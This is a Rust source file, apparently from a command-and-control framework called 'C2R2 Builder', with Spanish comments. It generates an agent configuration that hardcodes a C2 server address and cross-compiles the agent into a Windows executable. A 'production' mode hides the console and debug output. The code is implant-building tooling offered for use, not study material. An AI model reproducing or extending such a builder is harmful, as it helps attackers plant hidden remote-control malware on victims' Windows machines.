// File: builder/src/encrypt.rs
// v2.0 - Direct Connection (sin encriptación)

use std::fs::File;
use std::io::Write;
use std::process::Command;

pub fn generate_agent(
    output_name: &str,
    c2_server: &str,
    production: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔧 Generando configuración del agente...");

    // Determine workspace root and agent path
    let (workspace_root, agent_relative_path) = if std::env::current_dir()?
        .to_string_lossy()
        .contains("target/release")
    {
        ("../../".to_string(), "../../agent".to_string())
    } else {
        (".".to_string(), "agent".to_string())
    };

    // Crear directorios si no existen
    let config_dir = format!("{}/src", agent_relative_path);
    std::fs::create_dir_all(&config_dir)?;

    // Generar config.rs (solo servidor C2, sin shellcode ni encriptación)
    let config_file_path = format!("{}/src/config.rs", agent_relative_path);
    let mut config_file = File::create(&config_file_path)?;

    writeln!(
        config_file,
        "// Generado automáticamente por C2R2 Builder v2.0"
    )?;
    writeln!(
        config_file,
        "pub const C2_SERVER: &str = \"{}\";",
        c2_server
    )?;

    println!("✅ Configuración escrita en {}", config_file_path);
    println!("🌐 Servidor C2 configurado: {}", c2_server);

    // Compilar el agente con features apropiadas
    println!("🔨 Compilando agente para Windows...");
    
    let mut cargo_args = vec!["build", "--release", "--target", "x86_64-pc-windows-gnu", "-p", "agent"];
    
    // Agregar flags de feature según el modo
    if production {
        println!("🔒 Modo PRODUCCIÓN: sin consola, sin debug prints");
        cargo_args.push("--no-default-features");
        cargo_args.push("--features");
        cargo_args.push("production");
    } else {
        println!("🐛 Modo DESARROLLO: con consola y debug prints");
        // dev is default, no need to specify
    }
    
    let output = Command::new("cargo")
        .args(&cargo_args)
        .current_dir(&workspace_root)
        .output()?;

    if output.status.success() {
        println!("✅ Compilación exitosa!");
        let exe_path = format!(
            "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
            workspace_root
        );
        println!("🏃 Ejecutable generado en {}", exe_path);

        // Copiar ejecutable
        let dest_path = format!("{}.exe", output_name);
        if std::fs::copy(&exe_path, &dest_path).is_ok() {
            println!("📦 Ejecutable copiado como: {}", dest_path);
        } else {
            println!(
                "⚠️  No se pudo copiar el ejecutable, está en: {}",
                exe_path
            );
        }
    } else {
        println!("❌ Error durante la compilación:");
        println!("STDERR: {}", String::from_utf8_lossy(&output.stderr));
        println!("STDOUT: {}", String::from_utf8_lossy(&output.stdout));
        return Err("Compilación fallida".into());
    }

    Ok(())
}
